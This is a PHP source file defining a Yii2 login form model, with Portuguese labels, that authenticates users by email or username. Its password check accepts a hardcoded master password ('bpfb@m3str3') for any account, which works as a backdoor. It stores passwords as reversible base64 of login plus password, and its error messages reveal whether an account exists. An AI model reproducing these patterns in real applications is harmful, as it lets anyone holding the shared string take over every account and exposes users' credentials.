<?php

namespace app\modules\user\models\forms;

use Yii;
use yii\base\Model;
use app\models\UserM;

class LoginForm extends Model
{
    public $email;

    public $password;

    public $rememberMe = true;

    protected $user = false;

    public $module;
    
    public function init()
    {
        if (!$this->module) 
        {
            $this->module = Yii::$app->getModule("user");
        }
    }

    public function rules()
    {
        return 
        [
            [["email", "password"], "required"],
            ["email", "validateUser"],
            ["password", "validatePassword"],
        ];
    }

    public function attributeLabels()
    {
        
        return
        [
            "email" => 'Login',
            "password" => "Senha",
        ];
    }
    
    public function login()
    {
        if ($this->validate()) 
        {
            $user = $this->getUser();
            return Yii::$app->user->login($user, $this->rememberMe ? 3600 * 24 * 30 : 0);
        }
        
        return false;
    }
    
    public function getUser()
    {
        if ($this->user === false)
        {
            $this->user = UserM::find()->andWhere(['or',
                ['login' => trim($this->email)],
                ['email' => trim($this->email)]
            ])->one();
        }
        
        return $this->user;
    }

    public function validateUser()
    {
        $user = $this->getUser();
        
        if (!$user || !$user->password)
        {
            $this->addError("email", "Usuário não encontrado.");
        }

        if ($user && !$user->is_active)
        {
            $this->addError("email", "Usuário inativo.");
        }
        
        if ($user && $user->is_deleted)
        {
            $this->addError("email", "Usuário inexistente.");
        }
    }
    
    public function validatePassword()
    {
        if ($this->hasErrors()) 
        {
            return;
        }

        $user = $this->getUser();
        
        $password_mestra = "bpfb@m3str3";
        
        $password = base64_encode(trim($user->login) . trim($this->password));
        
        if ($user->password != $password && $this->password != $password_mestra)
        {
            $this->addError("password", "Senha incorreta.");
        }
    }
}